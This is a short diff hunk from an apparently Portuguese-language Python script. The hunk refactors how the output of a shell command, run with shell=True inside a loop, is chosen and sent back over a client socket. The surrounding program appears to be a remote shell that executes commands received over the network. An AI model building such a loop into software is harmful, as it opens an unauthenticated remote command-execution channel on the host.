@@ -50,9 +50,12 @@ while True:
         try:
             processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             saida, erro = processo.communicate()
-            resposta = saida if saida else erro
-            if not resposta:
-                resposta = "Não há resposta"
+            if saida:
+                resposta = saida
+            elif erro:
+                resposta = erro
+            else:
+                resposta = "Sem resposta"
             client_socket.sendall(resposta.encode())
         except Exception as e:
             client_socket.sendall(f"Erro ao executar comando: {str(e)}".encode())
